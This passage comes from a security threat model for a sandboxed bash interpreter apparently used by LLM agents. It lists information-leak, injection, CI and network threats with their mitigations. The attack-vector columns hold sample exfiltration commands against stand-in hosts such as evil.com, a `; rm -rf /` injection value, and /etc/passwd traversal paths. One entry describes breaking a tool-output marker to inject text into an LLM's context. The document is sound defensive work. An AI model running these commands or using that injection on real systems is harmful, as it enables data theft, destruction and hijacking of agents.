| TM-INF-022 | Library Debug shapes leak via stderr | Builtins wrapping external libs (jaq, regex, serde_json, semver, chrono, …) format errors with `format!("{:?}", e)` and dump internal struct shapes into stderr — e.g. jq printed `(File { code: "<800 chars of prepended compat-defs source>", path: () }, [("@tsv", Filter(0))])` to LLM agents | Three-layer enforcement, all run by `cargo test`: (1) static — `builtins::tests::no_debug_fmt_in_builtin_source` walks every `crates/bashkit/src/builtins/*.rs` and forbids `{:?}` / `{:#?}` / `{name:?}` (per-line opt-out: `// debug-ok: <reason>`); (2) dynamic per-tool — each tool's `mod tests` calls `bashkit::testing::assert_no_leak` with malformed inputs; (3) fuzz — every cargo-fuzz target plus 5 proptest cases call `bashkit::testing::assert_fuzz_invariants` against random input and check the same invariants on stderr/stdout | **FIXED** |
| TM-INF-023 | jq `halt` / `halt_error` terminate the host process | jaq-std 3.0's `halt(N)` native calls `std::process::exit(exit_code)`. `defs.jq` wraps it with `def halt: halt(0);` and `def halt_error(...): ..., halt(...);`. Untrusted jq filters can invoke `halt` / `halt_error` to exit the entire embedding process, escaping the `ExecResult`-based sandbox boundary and causing process-wide DoS for any caller hosting bashkit. | Strip the upstream `halt` native from `jaq_std::funs::<D>()` and chain in a safe replacement that pops the variable argument and returns `Error::str("halt is disabled in the bashkit sandbox")`. The wrapper defs (`halt`, `halt_error`) still resolve, so callers see a normal jq runtime error (exit 5) instead of the host being killed. Regression tests in `builtins::jq::tests`: `halt_does_not_terminate_host_process`, `halt_with_arg_does_not_terminate_host_process`, `halt_error_does_not_terminate_host_process`. | **FIXED** |
| TM-INF-024 | Host env side-channel via clap `Arg::env(...)` | Clap-based builtins ported from uutils (currently `ls`, with `.env("TABSIZE")` and `.env("TIME_STYLE")` on `uu_app()`) resolve those defaults from `std::env`, not bashkit's `ctx.env`. This breaks the sandbox boundary two ways: (1) presence-probe — a script can tell whether the host process has `TIME_STYLE`/`TABSIZE` set by observing `ls`'s behaviour; (2) availability — a host- or container-set `TIME_STYLE` materialises as a clap value source for an option bashkit hasn't implemented yet, so the unsupported-option gate fires on every plain `ls` and breaks the builtin for unrelated tenants | Four-layer fix: (1) **codegen strips runtime `.env(...)` and harvests it** — `bashkit-coreutils-port` rewrites `.env("FOO")` chained method calls out of every Arg builder it ports AND emits a sidecar `<UTIL>_ENV_DEFAULTS: &[EnvDefault]` table recording each stripped annotation; (2) **virtual-env shim** — `crate::builtins::clap_env::apply_env_defaults` rewrites argv from `ctx.env` (never `std::env`) before `try_get_matches_from`, emulating clap's "argv > env > default" precedence so uutils' env-default UX is preserved without re-opening the host channel; (3) **static guards** — `no_clap_env_in_generated_parsers` forbids runtime `.env(` calls in `generated/*.rs`, and `every_generated_parser_emits_env_defaults_table` enforces every util emits the sidecar (uniform surface, no per-util conditionals); (4) **defence-in-depth** — workspace `clap` dep drops the `env` cargo feature, so a re-introduced `.env(...)` fails to compile rather than silently re-opening the channel. Coverage: ls runtime tests pin both directions — `ls_ignores_host_time_style_and_tabsize` (host `std::env` ignored) and `ls_honors_virtual_env_time_style` (virtual `ctx.env` honoured) | **FIXED** |
| TM-INF-025 | Untrusted generated Rust runs in drift CI with repository write token | The coreutils argument-drift workflow consumes third-party `uutils/coreutils` source, regenerates Rust from `uu_app()`, then builds/tests bashkit. If the generator preserved arbitrary upstream statements and the same job held `contents: write`/`pull-requests: write`, malicious upstream code could execute during parser construction with repository write impact. | Two-layer fix: (1) `bashkit-coreutils-port` validates args-mode `uu_app()` before emission and accepts only (a) a single tail clap `Command` builder expression or (b) `let <ident> = Command::new(...)<chain>; <ident>.<method>(...)<chain>` where the initializer is itself a Command::new chain and the tail's innermost receiver is the let-bound ident; both shapes run through the same disallowed-method/closure/macro/block visitor. Regression tests `rejects_executable_statements_in_uu_app`, `rejects_let_with_non_command_initializer`, `rejects_tail_not_chained_off_let_binding`, and `rejects_three_statement_body` prove write+abort, hijacked initializers, mismatched tails, and inserted statements all fail codegen. (2) `.github/workflows/coreutils-args-drift.yml` separates privilege: regeneration/build/test has only `contents: read` and `persist-credentials: false` on both checkouts; the later `open-pr` job gets write permission but does not build or execute generated Rust, only commits the tested artifact. | **FIXED** |
| TM-INF-026 | Fork-PR secret exfiltration via approved CI run | GitHub's first-time-contributor approval gate runs the workflow file **from the PR head**, not an audited snapshot. Once a contributor is approved, subsequent pushes auto-run by default. The `examples` job in `.github/workflows/ci.yml` previously set `DOPPLER_TOKEN` at job level and `ANTHROPIC_API_KEY` at step level, so a fork PR could edit any `examples/*.rs`, `build.rs`, or shell script the job runs, read `$DOPPLER_TOKEN`/`$ANTHROPIC_API_KEY` from the environment, and exfiltrate. `DOPPLER_TOKEN` is the master key — it can fetch every other secret in the Doppler config (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GITHUB_TOKEN`, …), so a single leak compromises all of them. Additionally, every `doppler run --` in CI injected the entire Doppler config into the step's process env, exposing far more than the script under test actually reads. | Three-layer fix in `.github/workflows/ci.yml`, `js.yml`, `publish-js.yml`: (1) **fork guard** — secret-using steps gate on `github.event.pull_request.head.repo.fork != true` so fork PRs never see real secrets; `coverage.yml` and `js.yml` already followed this pattern. (2) **step-scoped secrets** — removed job-level `env: DOPPLER_TOKEN`; each step sets only the tokens it needs in its own `env:`. (3) **least-privilege Doppler injection** — every `doppler run` call site now uses `--only-secrets <KEY>` (e.g. `--only-secrets ANTHROPIC_API_KEY` for the LLM agent example, `--only-secrets OPENAI_API_KEY` for OpenAI-backed scripts) so the runtime env carries exactly the secret the script reads. Also migrated `ANTHROPIC_API_KEY` off GitHub Actions secrets onto Doppler so `DOPPLER_TOKEN` is the only secret CI needs from GitHub. | **FIXED** |
| TM-INF-027 | Package publish from unverified release refs | A user with Actions/write privileges can manually dispatch release or publish workflows from a branch or from an unprotected `vX.Y.Z` tag. Because `release.yml` dispatches downstream package and CLI workflows with `--ref "$TAG"`, and `publish-js.yml` previously treated stable `package.json` semver as `latest` even on non-tag refs, an attacker-controlled ref could become the source for official crates.io/npm/PyPI release artifacts or prebuilt CLI/Homebrew artifacts. | Release dispatches require the full ref `refs/heads/main` (not the ambiguous short ref name), `release.yml` verifies the release source is reachable from `origin/main`, and it verifies the created tag resolves to the current `GITHUB_SHA` before dispatching publish workflows; `publish.yml` rejects manual publish runs unless `GITHUB_REF` is a stable release tag, verifies that tag matches `Cargo.toml`, and verifies the checked-out commit is reachable from `origin/main`; `publish-js.yml` verifies the publish commit is reachable from `origin/main`, only assigns npm `latest` for stable `vX.Y.Z` tag refs, and requires the tag version to match `package.json`; `publish-python.yml` gates artifact inspection/publication on the same main-reachable stable-tag and Cargo version checks; `cli-binaries.yml` accepts only stable `vX.Y.Z` inputs, verifies the workflow ref matches the tag, verifies the tag matches `Cargo.toml`, and verifies the tag commit is reachable from `origin/main` before building/uploading binaries or updating Homebrew. | **FIXED** |
| TM-INF-028 | JS `onOutput` callback errors expose host stack traces | When a caller-supplied `onOutput` callback throws, `toNativeOnOutput` in `wrapper.ts` previously propagated `error.stack`, which contains host file paths (e.g. `/home/user/server/wrapper.ts:363`) and internal function names across the sandbox/caller boundary. Because script output is attacker-controlled and drives the callback, an attacker could trigger a throw and read host deployment paths from the resulting error. | Replace `error.stack` with `error.message` only; apply a regex to strip absolute-path and `file://` URL segments from the message (guards against attacker-controlled message injection); cap at 256 chars. Regression test `onOutput error does not leak stack trace or host paths` in `__test__/streaming-output.spec.ts` verifies no stack frames or host paths appear in the propagated error. Mitigation point annotated with `// THREAT[TM-INF-028]` in `wrapper.ts`. | **FIXED** |

**TM-INF-022**: Generalizes TM-INF-016 to cover the whole builtin surface.
The originating bug was `builtins/jq/` formatting jaq's compile/parse
errors with `{:?}`, leaking the jaq `File` struct, the prepended compat-
defs source we splice into every filter, and the raw `Undefined::Filter(N)`
variant tags. Fix: replaced `{:?}` with custom `format_jq_compile_errors`
/ `format_jq_load_errors` that emit short jq-style messages
(`<name>/<arity> is not defined`), capped at 1 KB. Generalized to all
builtins via the static + dynamic + fuzz guards described above. New
builtins that wrap library errors must use Display (`{}`) or a domain-
specific formatter — see `format_compile_errors` in `builtins/jq/errors.rs`
as the reference shape.

The fuzz layer also catches three sister threats with the same
machinery (`bashkit::testing::assert_fuzz_invariants`):
- **TM-INF-013 regression**: `fuzz_init()` seeds the host OS env with
  the magic value `BASHKIT_FUZZ_HOST_CANARY_47a83bcf_DO_NOT_LEAK` once
  per process. Every fuzz iteration asserts the canary appears in
  neither stdout nor stderr — a builtin reading `std::env::vars()`
  instead of the sandboxed `ctx.env` trips this immediately.
- **TM-INF-016 (host paths)**: `UNIVERSAL_BANNED` includes `/rustc/`,
  `/.cargo/registry/`, `target/{debug,release}/deps/`,
  `/.rustup/toolchains/` so leaked panic backtraces / build-artifact
  paths fail the assertion.
- **stderr flooding**: per-call stderr capped at `MAX_STDERR_BYTES`
  (1 KB) — one bad input that produces 10 MB of library-error spam
  trips this.

Fuzz/proptest targets inline arbitrary input bytes into shell scripts,
so bash, ls, and uutils clap CLIs produce error messages that quote the
input verbatim (`bash: <cmd>: command not found`, `bash: <path>: No such
file or directory`, `ls: cannot access '<path>': …`,
`error: unexpected argument '<input>' found`,
`  tip: to pass '<input>' as a value, use '-- <input>'`,
`Usage: ls [OPTION]... [FILE]...`,
`For more information, try '--help'.`). Those echoes can accidentally
form a banned substring — e.g. user input `Tok"` becomes the command
name `Tok:`, and bash's `bash: %s: command not found` formatter renders
it as `bash: Tok:: command not found`, matching the parser-token shape
`Tok::`; or user input `--i{fi/rustc/fi{{RRi` lands in clap's
`error: unexpected argument '…' found` chrome and trips the `/rustc/`
host-path check. They are not internal Debug leaks. To keep the leak
detector strict on real internals while suppressing this class of false
positive, `assert_fuzz_invariants` strips lines that match a recognized
real-shell or clap error template before the banned-shape check; the
byte-length cap and the host-canary check still run on the unfiltered
stderr so flood and TM-INF-013 regressions are still caught. The strict
per-builtin path (`assert_no_leak`) is unchanged — non-fuzz tests must
not produce shell echoes in the first place.

**TM-INF-013**: The jq builtin previously called `std::env::set_var()` to expose
shell variables to jaq's `env` function. This also made host process env vars (API keys, tokens)
visible. Additionally, `set_var` is thread-unsafe (unsound in Rust 2024 edition). Fixed: a custom
`env` def in `builtins/jq/compat.rs` reads from a `$__bashkit_env__` global wired up in
`builtins/jq/mod.rs` from `ctx.env`/`ctx.variables`.

**TM-INF-014**: `$$` (`interpreter/mod.rs:7615`) returns `std::process::id()`, leaking the real
host PID. All other system builtins return virtual values. Fix: return fixed or random value.

**TM-INF-015**: `network/allowlist.rs:144` echoes full URL in error messages, potentially including
`user:pass@` in the authority. Fix: apply `LogConfig::redact_url()` to URLs in errors.

**TM-INF-016**: Multiple error paths leak internal details: `error.rs:38` wraps `std::io::Error`
(may include host paths), `network/client.rs:224` wraps reqwest errors (resolved IPs, TLS info),
`git/client.rs` includes VFS paths and remote URLs, `scripted_tool/execute.rs:323` uses `{:?}`
(Debug format) while `BashTool` uses `error_kind()` — inconsistent. Fix: use Display format
consistently, wrap external errors with sanitized messages.

**Current Risk**: MEDIUM - Caller must sanitize environment variables; jq leaks host env

**Caller Responsibility** (TM-INF-001): Do NOT pass sensitive env vars:
```rust
// UNSAFE - leaks secrets
Bash::builder()
    .env("DATABASE_URL", "postgres://user:pass@host/db")
    .build();

// SAFE - only pass needed vars
Bash::builder()
    .env("HOME", "/home/user")
    .build();
```

#### 3.2 Host Information

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INF-005 | Hostname | `hostname`, `$HOSTNAME` | Returns configurable virtual value | **MITIGATED** |
| TM-INF-006 | Username | `whoami`, `$USER` | Returns configurable virtual value | **MITIGATED** |
| TM-INF-007 | IP address | `ip addr`, `ifconfig` | Not implemented | **MITIGATED** |
| TM-INF-008 | System info | `uname -a` | Returns configurable virtual values | **MITIGATED** |
| TM-INF-009 | User ID | `id` | Returns hardcoded uid=1000 | **MITIGATED** |

**Current Risk**: NONE - System builtins return configurable virtual values (never real host info)

**Implementation**: `builtins/system.rs` provides configurable system builtins:
- `hostname` → configurable (default: "bashkit-sandbox")
- `uname` → hardcoded Linux 5.15.0 / configurable hostname
- `whoami` → configurable (default: "sandbox")
- `id` → uid=1000(configurable) gid=1000(configurable)

**Configuration**:
```rust
Bash::builder()
    .username("deploy")      // Sets whoami, id, and $USER env var
    .hostname("my-server")   // Sets hostname, uname -n
    .build();
```

#### 3.3 Network Exfiltration

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INF-010 | HTTP exfil | `curl https://evil.com?data=$SECRET` | Network allowlist | **MITIGATED** |
| TM-INF-011 | DNS exfil | `nslookup $SECRET.evil.com` | No DNS commands | **MITIGATED** |
| TM-INF-012 | Timing channel | Response time variations | Not addressed | Minimal risk |

**Current Risk**: LOW - Network allowlist blocks unauthorized destinations

---

### 4. Injection Attacks

#### 4.1 Command Injection

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INJ-001 | Variable injection | `$user_input` containing `; rm -rf /` | Variables not re-parsed | **MITIGATED** |
| TM-INJ-002 | Backtick injection | `` `$malicious` `` | Parsed as command sub | **MITIGATED** |
| TM-INJ-003 | eval bypass | `eval $user_input` | eval sandboxed (builtins only) | **MITIGATED** |

**Current Risk**: MEDIUM - Internal variable namespace injection (TM-INJ-009) needs remediation

| TM-INJ-009 | Internal variable namespace injection | Set `_NAMEREF_`, `_READONLY_`, etc. directly | Every write path (`set_variable`, `read`/`read -a`, `printf -v`, `local`, `declare`, `readonly`, `export`, `dotenv`, `unset`) checks `is_internal_variable()` and refuses internal-prefix names; `set` / `declare -p` filter them from listings (TM-INF-017) | **MITIGATED** |

| TM-INJ-011 | Cyclic nameref silent resolution | Cyclic namerefs (a→b→a) silently resolve after 10 iterations instead of erroring | `resolve_nameref()` tracks visited names in a `HashSet`; on cycle detection it returns the original name and the lookup sees no value | **MITIGATED** |
| TM-INJ-018 | `dotenv` internal variable prefix injection | `.env` file with `_NAMEREF_x=target` sets internal interpreter variables via `ctx.variables.insert()` | `Dotenv::execute` calls `is_internal_variable(&full_key)` and skips injected internal-prefix keys (`builtins/dotenv.rs:138`) | **MITIGATED** |
| TM-INJ-019 | `unset` removes readonly variables | `readonly X=v; unset X` removes the variable despite readonly attribute | `execute_unset_builtin` and `Unset` builtin both consult the `VarAttrs::READONLY` flag in the dedicated `var_attrs` map, emit `bash: unset: <name>: cannot unset: readonly variable`, and return exit 1 | **MITIGATED** |
| TM-INJ-020 | `declare` overwrites readonly variables | `readonly X=v; declare X=new` overwrites without error | `declare` assignment path consults `VarAttrs::READONLY` via `is_var_readonly()`, emits `bash: declare: <name>: readonly variable`, returns exit 1 | **MITIGATED** |
| TM-INJ-021 | `export` overwrites readonly variables | `readonly X=v; export X=new` overwrites without error | `export NAME=VALUE` consults `VarAttrs::READONLY` via `ShellRef::is_var_readonly()`, emits `bash: export: <name>: readonly variable`, returns exit 1 | **MITIGATED** |
| TM-INJ-022 | XML boundary break via tool output (`sanitizeOutput`) | When `sanitizeOutput` is enabled the JS adapters (anthropic, openai) wrap tool output in `<tool_output>…</tool_output>` markers. A script that emits `</tool_output>` in its stdout can close the marker early and inject arbitrary text into the LLM context, bypassing the boundary | Escape `&`, `<`, `>` in content before inserting between tags (`anthropic.ts`, `openai.ts` `formatOutput`). Tests: `ai-adapters.spec.ts` — "sanitizeOutput escapes </tool_output> in stdout" and "sanitizeOutput escapes & < > in stdout" for both adapters | **FIXED** |

**TM-INJ-011** (mitigated): `interpreter/mod.rs::resolve_nameref` tracks visited names in a
`HashSet`. When a cycle (e.g. `a→b→a`, `a→a`, or longer chains) is detected on the next hop,
the resolver returns the original name and breaks the loop, so `${a}` looks up the (unset)
top-level variable rather than infinite-recursing. We do not emit Bash's exact
`circular name reference` warning, but the safety property — no hang, no stack overflow, no
silent traversal to a stale variable — is upheld. Regression tests:
`tests/threat_model_tests.rs::tm_inj_011_*`.

**TM-INJ-018** (mitigated): `builtins/dotenv.rs:138` — `Dotenv::execute` calls
`is_internal_variable(&full_key)` and skips any key in the historically-reserved namespace
(`_NAMEREF_*`, `_READONLY_*`, `_UPPER_*`, `_LOWER_*`, `_INTEGER_*`, `_ARRAY_READ_*`,
`_SHIFT_COUNT`, `_SET_POSITIONAL`). The interpreter no longer stores attribute markers in
`variables` under these prefixes — readonly/integer/lower/upper attributes live in a
dedicated `VarAttrs` bitset map and namerefs in a dedicated `namerefs: HashMap<String, String>`
— so even a dotenv key that slipped past the filter could not influence interpreter behavior.
The prefix block is kept as defense-in-depth (and to suppress confusing output like
`echo $_NAMEREF_x`). Regression test: `tests/threat_model_tests.rs::tm_inj_018_dotenv_rejects_internal_prefixes`.

**TM-INJ-009** (mitigated): historically the interpreter used magic variable prefixes
(`_NAMEREF_<name>`, `_READONLY_<name>`, `_INTEGER_<name>`, `_UPPER_<name>`, `_LOWER_<name>`)
to record attributes inside the shared `variables` HashMap. That allowed user scripts to
forge attributes by writing the prefixed key directly. The interpreter now stores
attributes in a dedicated `var_attrs: HashMap<String, VarAttrs>` bitset and namerefs in a
dedicated `namerefs` map; user scripts cannot reach these from bash. `is_internal_variable()`
still rejects writes to the legacy prefixes from every write path (`set_variable`, `read`,
`printf -v`, `local`, `declare`, `readonly`, `export`, `dotenv`, `unset`) as
defense-in-depth, and `set` / `declare -p` filter the prefixes from listings (TM-INF-017).
Regression tests live in `tests/security_audit_pocs.rs` (declare/readonly/export/local can
not inject any of the legacy markers) and `tests/threat_model_tests.rs::tm_inj_009_*`.

**Example**:
```bash
# User provides: "; rm -rf /"
user_input="; rm -rf /"
echo $user_input
# Output: "; rm -rf /" (literal string, not executed)
```

#### 4.2 Path Injection

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INJ-004 | Null byte | `cat "file\x00/../etc/passwd"` | Rust strings no nulls | **MITIGATED** |
| TM-INJ-005 | Path traversal | `../../../../etc/passwd` | Path normalization | **MITIGATED** |
| TM-INJ-006 | Encoding bypass | URL/unicode encoding | PathBuf handles | **MITIGATED** |
| TM-INJ-010 | Tar path traversal within VFS | `tar -xf` with `../../../etc/passwd` entry names | `archive.rs` rejects entries whose absolute name escapes the extract base or whose resolved path doesn't `starts_with(&extract_base)`, returning `tar: <name>: path traversal blocked` and exit 1 | **MITIGATED** |
| TM-INJ-017 | Unzip path traversal within VFS | `unzip` with `../../../etc/passwd` entry names in custom BKZIP format | `zip_cmd.rs::validate_extract_entry_path` rejects any path component that is `ParentDir`, `RootDir`, `Prefix`, or `CurDir` and surfaces `unzip: invalid archive entry path: <name>` | **MITIGATED** |

**TM-INJ-010** (mitigated): `builtins/archive.rs` validates each tar entry name against
`extract_base` before any write. Entries starting with `/`, containing `..`, or whose
`resolve_path(&extract_base, &name)` does not `starts_with(&extract_base)` are rejected
with `tar: <name>: path traversal blocked` (exit 1, no file created). Regression tests:
`builtins::archive::tests::test_tar_extract_path_traversal_dotdot_blocked`,
`…_absolute_blocked`, `…_dir_dotdot_blocked` (3 tests).

**TM-INJ-017** (mitigated): `builtins/zip_cmd.rs::validate_extract_entry_path` walks the
entry path's `Path::components()` and rejects anything that is not `Component::Normal`,
including `..`, leading `/`, drive prefixes, and `.`. The unzip loop then surfaces
`unzip: invalid archive entry path: <name>` with exit 1 and aborts the extract.
Regression test: `builtins::zip_cmd::tests::test_unzip_rejects_path_traversal_entries`.

**Current Risk**: LOW - Rust's type system prevents most attacks; tar traversal is VFS-contained

#### 4.3 XSS-like Issues

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-INJ-007 | HTML in output | Script outputs `<script>` and caller renders stdout/stderr in a web UI | Caller must HTML-escape rendered output and use a restrictive Content Security Policy | **CALLER RISK** |
| TM-INJ-008 | Terminal escape | ANSI escape sequences | Caller should sanitize | **CALLER RISK** |

**Current Risk**: LOW - Bashkit does not render output itself; embedding UIs own display sanitization.

**Caller Responsibility** (TM-INJ-007, TM-INJ-008): Escape or sanitize output before display:
```rust
let result = bash.exec(script).await?;
let safe_html = html_escape(&result.stdout);
let safe_output = sanitize_terminal_escapes(&result.stdout);
```

---

### 5. Network Security

#### 5.1 DNS Manipulation

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-NET-001 | DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching + `PrivateIpFilteringResolver` blocks private IPs at connect time | **MITIGATED** |
| TM-NET-003 | DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |

**Current Risk**: NONE - Network allowlist uses literal host/IP matching, no DNS

**Implementation**: `network/allowlist.rs` - `matches_pattern()` function
```rust
// Allowlist matches literal strings, not resolved IPs
allowlist.allow("https://api.example.com");
// "api.example.com" must match exactly - no DNS lookup
```

#### 5.2 Network Bypass

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-NET-004 | IP instead of host | `curl http://93.184.216.34` | Literal IP blocked unless allowed | **MITIGATED** |
| TM-NET-005 | Port scanning | `curl http://internal:$port` | Port must match allowlist | **MITIGATED** |
| TM-NET-006 | Protocol downgrade | HTTPS → HTTP | Scheme must match | **MITIGATED** |
| TM-NET-007 | Subdomain bypass | `evil.example.com` | Exact host match | **MITIGATED** |
| TM-NET-015 | Domain allowlist scheme bypass | `allow_domain()` permits both http and https | By design; use URL patterns for scheme control | **BY DESIGN** |
| TM-NET-016 | Domain allowlist port bypass | `allow_domain()` permits any port | By design; use URL patterns for port control | **BY DESIGN** |
| TM-NET-017 | Wildcard subdomain exfiltration | `curl https://$SECRET.example.com` | Wildcards not supported; exact domain match only | **MITIGATED** |

**Current Risk**: LOW - Strict allowlist enforcement

#### 5.3 HTTP Attack Vectors

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-NET-008 | Large response DoS | `curl https://evil.com/huge.bin` | Response size limit (10MB) | **MITIGATED** |
| TM-NET-009 | Connection hang | Server never responds | Connection timeout (10s default, user-configurable, clamped 1s-10min) | **MITIGATED** |
| TM-NET-010 | Slowloris attack | Slow response dripping | Read timeout (30s default, user-configurable, clamped 1s-10min) | **MITIGATED** |
| TM-NET-011 | Redirect bypass | `Location: http://evil.com` | Redirects not auto-followed | **MITIGATED** |
| TM-NET-012 | Chunked encoding bomb | Infinite chunked response | Response size limit (streaming) | **MITIGATED** |
| TM-NET-013 | Gzip bomb / Zip bomb | 10KB gzip → 10GB decompressed | Auto-decompression disabled | **MITIGATED** |
| TM-NET-014 | DNS rebind via redirect | Redirect to rebinded IP | Manual redirect requires allowlist check | **MITIGATED** |
| TM-NET-015 | Host proxy leakage | `HTTP_PROXY`/`HTTPS_PROXY` env vars route sandboxed traffic through host proxy | `.no_proxy()` on reqwest builder | **MITIGATED** |
| TM-NET-018 | JSON body injection | `http POST url name='x","admin":true'` via unescaped string formatting | Use `serde_json` for JSON construction | **MITIGATED** |
| TM-NET-019 | Query param injection | `http GET url q=='foo&admin=true'` injects extra params | URL-encode via local x-www-form-urlencoded encoder | **MITIGATED** |
| TM-NET-020 | Form body injection | `http --form POST url user='x&role=admin'` injects extra fields | URL-encode via local x-www-form-urlencoded encoder | **MITIGATED** |
| TM-NET-021 | Bot identity spoofing | Forge requests as a trusted bot | Ed25519 request signing (bot-auth feature, `specs/request-signing.md`) | **MITIGATED** (opt-in) |
| TM-NET-022 | IPv4-mapped IPv6 SSRF bypass | AAAA record returns `::ffff:127.0.0.1`, `::ffff:10.0.0.1`, `::ffff:169.254.169.254`, etc. — embedded v4 address would re-enter the v4 address space at the kernel/socket layer, but the v6 branch of `is_private_ip` only inspected `is_loopback`/`is_unspecified`/`fd00::/8`/`fe80::/10`, treating everything else as public | `is_private_ip` normalizes IPv4-mapped (`::ffff:0:0/96`) and IPv4-compatible (`::a.b.c.d`) v6 forms back to v4 via `Ipv6Addr::to_ipv4_mapped()` and applies the v4 classifier (`is_private_ipv4`). Tested via `test_is_private_ip_v4_mapped_v6_*` cases for loopback, RFC1918, AWS metadata (169.254.169.254), CGNAT, unspecified, public, and IPv4-compatible. Mitigation reaches both the v6 connect-time `PrivateIpFilteringResolver` and the URL/precheck path. | **FIXED** (#1569) |
| TM-NET-023 | HTTP-handler SSRF via fail-open precheck and rebind window | `HttpClient::check_private_ip` returned `Ok(())` on URL-parse failures and on URLs with no host, letting malformed targets reach the connect path with no IP filter. Custom `HttpHandler` implementations are doubly exposed because they don't get reqwest's connect-time `PrivateIpFilteringResolver` — even a successful precheck leaves a rebind window between validation and the moment the handler opens its own socket. | (1) `check_private_ip` now fails closed on malformed URLs and on URLs with no host. The direct-IP branch and the successful-DNS branch remain fail-closed against private addresses (including the v4-mapped IPv6 forms covered by TM-NET-022). Tested via `test_check_private_ip_fails_closed_on_invalid_url`, `test_check_private_ip_fails_closed_on_no_host`, `test_check_private_ip_blocks_literal_private_ip`, `test_check_private_ip_blocks_metadata_via_v4_mapped_v6`. (2) The `HttpHandler` trait doc explicitly assigns SSRF responsibility to network-capable custom handlers and points them at `bashkit::network::is_private_ip` for the same classifier the default reqwest path uses. DNS-lookup errors at the precheck still pass through (fail-open by design — the rebind / connect-time threat is the handler's responsibility, and failing closed there breaks legitimate `before_http` hook flows that intentionally target unresolved hostnames). | **MITIGATED** (#1570) |

**Current Risk**: LOW - Multiple mitigations in place

**Bot-auth signing** (feature `bot-auth`): When configured, all outbound HTTP requests from curl/wget/http builtins are transparently signed with Ed25519 per RFC 9421. Signing is non-blocking — failures send requests unsigned. See `specs/request-signing.md`.

**Implementation**: `network/client.rs`
```rust
// Security defaults (TM-NET-008, TM-NET-009, TM-NET-010)
const DEFAULT_MAX_RESPONSE_BYTES: usize = 10 * 1024 * 1024;  // 10MB
const DEFAULT_TIMEOUT_SECS: u64 = 30;
const MAX_TIMEOUT_SECS: u64 = 600;   // 10 min - prevents resource exhaustion
const MIN_TIMEOUT_SECS: u64 = 1;     // Prevents instant timeouts
const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);

// Redirects disabled by default (TM-NET-011, TM-NET-014)
.redirect(reqwest::redirect::Policy::none())

// Decompression disabled to prevent zip bombs (TM-NET-013)
.no_gzip()
.no_brotli()
.no_deflate()

// Ignore host proxy env vars (TM-NET-015)
.no_proxy()

// Response size checked during streaming (TM-NET-008, TM-NET-012)
async fn read_body_with_limit(&self, response: Response) -> Result<Vec<u8>> {
    // Streams response, checks size at each chunk
}
```

#### 5.4 HTTP Client Mitigations

| Mitigation | Implementation | Purpose |
|------------|---------------|---------|
| URL allowlist | Pre-request validation | Prevent unauthorized destinations |
| Response size limit | Streaming with byte counting | Prevent memory exhaustion |
| Connection timeout | 10s default (user-configurable via `--connect-timeout`) | Prevent connection hang |
| Read timeout | 30s default (user-configurable via `-m`/`-T`) | Prevent slow-response DoS |
| Timeout clamping | All timeouts clamped to [1s, 10min] | Prevent resource exhaustion |
| No auto-redirect | Policy::none() | Prevent redirect-based bypass |
| No auto-decompress | no_gzip/no_brotli/no_deflate | Prevent zip bomb attacks |
| Content-Length check | Pre-download validation | Fail fast on huge files |
| User-Agent controlled | HttpClient defaults to "bashkit/*"; curl builtin defaults to "curl/8.7.1" and honors explicit overrides | Identify non-builtin requests while matching curl wire behavior |

#### 5.5 Cryptographic Material Security

| ID | Threat | Attack Vector | Mitigation | Status |
|----|--------|--------------|------------|--------|
| TM-CRY-001 | Bot-auth private key recovery from process memory | Core dump, heap inspection, `/proc/<pid>/mem` after key use | `BotAuthConfig` zeroizes Ed25519 seed in `Drop`; debug output redacts key material | **MITIGATED** |

**Current Risk**: LOW - Key material remains process-resident while configured, but is now explicitly zeroized on drop.

#### 5.6 curl/wget Security Model

**Request Flow**:
```
Script: curl https://api.example.com/data
         │
         ▼
┌─────────────────────────────────────────┐
│ 1. URL Allowlist Check (BEFORE network) │
│    - Scheme match (https)               │
│    - Host match (literal)               │
│    - Port match (443 default)           │
│    - Path prefix match                  │
└─────────────────────────────────────────┘
         │ Allowed?
         │ No → Return "access denied" (exit 7)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 2. Connect with Timeout (10s)           │
│    - TCP connection                     │
│    - TLS handshake                      │
└─────────────────────────────────────────┘
         │ Success?
         │ No → Return "request failed" (exit 1)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 3. Content-Length Check                 │
│    - If header present, check < 10MB    │
│    - If > 10MB, abort early             │
└─────────────────────────────────────────┘
         │ Size OK?
         │ No → Return "response too large" (exit 63)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 4. Stream Response with Size Limit      │
│    - Read chunks                        │
│    - Accumulate bytes                   │
│    - Abort if total > 10MB              │
└─────────────────────────────────────────┘
         │ Complete?
         │ No → Return "response too large" (exit 63)
         │ Yes ↓
┌─────────────────────────────────────────┐
│ 5. Handle Redirect (if -L flag)         │
│    - Extract Location header            │
│    - Check EACH redirect URL against    │
│      allowlist (go to step 1)           │
│    - Max 10 redirects                   │
└─────────────────────────────────────────┘
         │
         ▼
     Return response to script
```

**Exit Codes**:
- 0: Success
- 1: General error
- 3: URL malformed
- 7: Access denied (allowlist)
- 22: HTTP error (with -f flag)
- 28: Timeout
- 47: Max redirects exceeded
- 63: Response too large

#### 5.7 Domain Egress Allowlist Design Rationale

Bashkit's network allowlist uses **literal host matching** — the virtual equivalent of
SNI (Server Name Indication) filtering on TLS client-hello headers. This is the same
approach used by production sandbox environments (e.g., Vercel Sandbox) for egress
control.

**Why not DNS-based filtering?**
Scripts can hardcode IP addresses, bypassing any DNS-level controls entirely.

**Why not IP-based filtering?**
